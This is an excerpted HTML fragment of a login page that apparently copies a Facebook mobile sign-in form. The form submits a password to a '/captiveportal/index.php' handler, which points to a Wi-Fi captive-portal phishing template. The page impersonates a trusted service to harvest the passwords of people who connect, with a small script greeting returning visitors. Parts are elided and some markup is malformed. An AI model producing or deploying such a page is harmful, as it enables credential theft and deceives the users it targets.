                ...
                <div class="_5rut" data-sigil="login_inner">
                  <form method="post" action="/captiveportal/index.php" class="mobile-login-form _9hp- _5spm" id="login_form" novalidate="1" data-sigil="m_login_form" data-autoid="autoid_2" onsubmit="redirect()">
                    ...
                    <div>
                      ...
                      <div id="message" style="padding: 10px 0;">
                      </div>
                      ...
                      if (sessionStorage.visited) {
                        ...
                        sessionStorage.setItem("visited", "Good to see you again...");
                      }


                      document.getElementById("message").innerHTML = sessionStorage.getItem("visited");
                      </script>
                            ...
                            <div class="_5909">
                              <div class="_7om2">
                                <div class="_4g34 _5i2i _52we">
                                  <div class="_5xu4">
                                    <input autocorrect="off" autocapitalize="off" class="m_login_password _56bg _4u9z _27z2 _8qtm" autocomplete="on" id="m_login_password" name="password" placeholder="Password" type="password" data-sigil="password-plain-text-toggle-input">
                                  </div>
                                </div>
                    ...
                    <div class="_2pie" style="text-align:center;">
                      <div id="u_0_4" data-sigil="login_password_step_element">
                        <button class="submit_btn" type="submit" value="Log In" class="_54k8 _52jh _56bs _56b_ _28lf _9cow _56bw _56bu" name="login" data-sigil="touchable login_button_block m_login_button" data-autoid="autoid_4"><span class="_55sr">Log In</span></button>
                      </div>
